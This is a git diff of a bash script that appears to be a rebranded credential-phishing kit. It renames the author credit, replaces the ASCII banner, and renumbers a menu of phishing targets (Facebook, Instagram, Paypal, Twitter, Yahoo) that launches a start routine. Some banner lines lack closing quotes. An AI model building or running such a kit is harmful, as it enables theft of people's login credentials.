@@ -1,8 +1,5 @@
 #!/bin/bash
-#code recorded by tech cochi
-#https://youtube.com/c/techcochi
-#https://github.com/rixon-cochi
-#https://techcochi.blogspot.com
+#code recorded by DEVILAND
 
 trap 'printf "\n";stop;exit 1' 2
 deps() {
@@ -13,22 +10,28 @@ command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Instal
 }
 banner() {
 clear
-printf " \e[91m ███████╗\e[0m\e[1;92m ███╗   ███╗ \e[0m\e[1;93m ███████╗  \e[0m\e[1;91m ▄█▀─▄▄▄▄▄▄▄─▀█▄ \e[0m\n"
-printf " \e[91m ██╔════╝\e[0m\e[1;92m ████╗ ████║ \e[0m\e[1;93m ██╔════╝ \e[0m\e[1;91m  ▀█████████████▀ \e[0m\n"
-printf " \e[91m ███████╗\e[0m\e[1;92m ██╔████╔██║ \e[0m\e[1;93m █████╗ \e[0m\e[1;91m        █▄███▄█ \e[0m\n"
-printf " \e[91m ╚════██║\e[0m\e[1;92m ██║╚██╔╝██║ \e[0m\e[1;93m ██╔══╝ \e[0m\e[1;91m         █████ \e[0m\n"
-printf " \e[91m ███████║\e[0m\e[1;92m ██║ ╚═╝ ██║ \e[0m\e[1;93m ██║ \e[0m\e[1;91m            █▀█▀█ \e[0m\n"
-printf " \e[91m ╚══════╝\e[0m\e[1;92m ╚═╝     ╚═╝ \e[0m\e[1;93m ╚═╝ \e[0m\e[40;38;5;82mversion\e[30;48;5;82m1.2\e[0m\n"
+printf " \e[91m██╗░░██╗░░░░░░\e[0m\e[1;91m                                  /^^^/           /]"
+printf " \e[91m╚██╗██╔╝░░░░░░\e[0m\e[1;91m                                 /   ]           / ]"
+printf " \e[91m░╚███╔╝░█████╗\e[0m\e[1;91m      O                  _______/    ]___       /  ]"
+printf " \e[91m░██╔██╗░╚════╝\e[0m\e[1;91m                       /                \_____/   /"
+printf " \e[91m██╔╝╚██╗░░░░░░\e[0m\e[1;91m    O                  _/   [@]  \ \                \"
+printf " \e[91m╚═╝░░╚═╝░░░░░░\e[0m\e[1;91m            ___//_    /..         | |                ]"
+printf " \e[91m                                         o     /o )   \/   VVVvvv\    | |         _/\    ]"
+printf " \e[91m                                           O<  )___\\_/\         |               /    \  ]"
+printf " \e[91m                                                          AAA^^^^^              /       \]"
+printf " \e[91m                                                            \_________\   \_____/
+printf " \e[91m                                                                       \    \"
+printf " \e[91m                                                                        \____\"
 printf " \e[44m CODE RE BY TECH COCHI \e[0m\n"
 printf " \n"
 }
 menu() {
-printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;92m Facebook \e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;92m Instagram \e[0m\n"   
-printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;92m Paypal \e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;92m Twitter \e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[1;92m Yahoo \e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m13\e[0m\e[1;31m]\e[0m\e[1;92m Update \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m1\e[0m\e[1;31m]\e[0m\e[1;92m Facebook \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m2\e[0m\e[1;31m]\e[0m\e[1;92m Instagram \e[0m\n"   
+printf " \e[1;31m[\e[0m\e[1;77m3\e[0m\e[1;31m]\e[0m\e[1;92m Paypal \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m4\e[0m\e[1;31m]\e[0m\e[1;92m Twitter \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m5\e[0m\e[1;31m]\e[0m\e[1;92m Yahoo \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m6\e[0m\e[1;31m]\e[0m\e[1;92m Update \e[0m\n"
 printf " \e[0m\e[1;31m[\e[0m\e[1;77m00\e[0m\e[1;31m] \e[0m\e[1;92mExit\e[0m\n"
 printf " \e[0m\n"        
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Select an option: \e[0m\e[1;91m\en' option
@@ -36,16 +39,16 @@ if [[ $option == 1 || $option == 01 ]]; then
 facebook
 elif [[ $option == 2 || $option == 02 ]]; then
 instagram
-elif [[ $option == 6 || $option == 06 ]]; then
+elif [[ $option == 3 || $option == 03 ]]; then
 server="paypal"
 start
-elif [[ $option == 10 ]]; then
+elif [[ $option == 4 ]]; then
 server="twitter"
 start
-elif [[ $option == 11 ]]; then
+elif [[ $option == 5 ]]; then
 server="yahoo"
 start
-elif [[ $option == 13 ]]; then
+elif [[ $option == 6 ]]; then
 bash update
 elif [[ $option == 0 || $option == 00 ]]; then
 exit 1
